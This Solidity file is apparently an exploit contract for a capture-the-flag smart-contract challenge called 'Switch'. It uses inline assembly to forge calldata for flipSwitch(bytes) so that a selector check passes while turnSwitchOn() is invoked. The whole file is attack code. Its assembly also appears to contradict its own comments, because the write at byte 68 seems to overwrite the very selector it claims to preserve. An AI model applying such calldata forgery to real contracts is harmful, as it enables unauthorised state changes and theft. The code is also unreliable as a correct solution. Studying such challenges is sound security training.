// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/Switch/Switch.sol";
import "../BlockUtils.sol";

contract SwitchExploit is BlockUtils {
    Switch victim;
        
    constructor(address _victim) {
        victim = Switch(payable(_victim));
    }
    
    function hack() public {
        bytes4 offSelector = victim.offSelector();
        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));

        // Prepare _data to be the function selector for turnSwitchOn()
        bytes memory _data = abi.encodePacked(onSelector);

        // Encode the call to flipSwitch(bytes)
        bytes memory data = abi.encodeWithSelector(victim.flipSwitch.selector, _data);

        // Manipulate calldata so that bytes at position 68 are offSelector
        // while _data remains as onSelector
        assembly {
            let dataPtr := add(data, 32) // Skip the length slot
            mstore(add(dataPtr, 36), 4) // Overwrite length of _data to 4
            mstore(add(dataPtr, 68), offSelector) // Overwrite data at position 68 with offSelector
        }

        // Call flipSwitch with the crafted data
        (bool success, ) = address(victim).call(data);
        require(success, "Call failed");
    }
}